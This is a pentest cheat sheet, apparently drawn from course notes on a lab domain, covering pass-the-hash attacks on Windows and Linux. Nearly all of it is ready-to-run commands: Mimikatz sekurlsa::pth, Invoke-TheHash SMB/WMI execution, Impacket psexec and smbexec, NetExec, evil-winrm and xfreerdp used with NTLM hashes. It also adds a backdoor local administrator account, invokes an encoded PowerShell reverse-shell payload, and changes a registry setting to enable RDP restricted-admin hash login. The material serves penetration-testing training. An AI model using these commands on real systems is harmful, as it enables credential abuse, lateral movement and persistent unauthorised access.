# Windows
## Pass the Hash with Mimikatz (Windows)
#### sekurlsa::pth
To use this module, we will need the following:
- `/user` - The user name we want to impersonate.
- `/rc4` or `/NTLM` - NTLM hash of the user's password.
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

---
## Pass the Hash with PowerShell Invoke-TheHash (Windows)
[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
Collection of powershell functions for performing PtH. When using `Invoke-TheHash`, we have two options: SMB or WMI command execution.
We need to specify the following parameters to execute commands in the target computer:
- `Target` - Hostname or IP address of the target.
- `Username` - Username to use for authentication.
- `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
- `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
- `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
#### Reverse shell
```powershell
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlA<SNIP>AKAApAA=="
```

---
# Linux
## Pass the Hash with Impacket (Linux)
#### Pass the Hash with Impacket PsExec
```shell
psexec.py administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
**Other tools**:
- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)
```shell
smbexec.py -share David -hashes :"c39f2beb3d2ec06a62cb887fb391dee0" "inlanefreight.htb"/"david"@"10.129.116.81"
```

---
## Pass the Hash with NetExec (Linux)
#### Pass the Hash with NetExec
```shell
nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
**Note**: Use `--local-auth` to authenticate locally and not via Kerberos.
#### NetExec - Command Execution
```shell
nxc smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

---
## Pass the Hash with evil-winrm (Linux)

```shell
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
**Note:** When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

---
## Pass the Hash with RDP (Linux)
#### Be sure to enable Restricted Admin Mode
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
#### Pass the Hash using RDP
```shell
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```


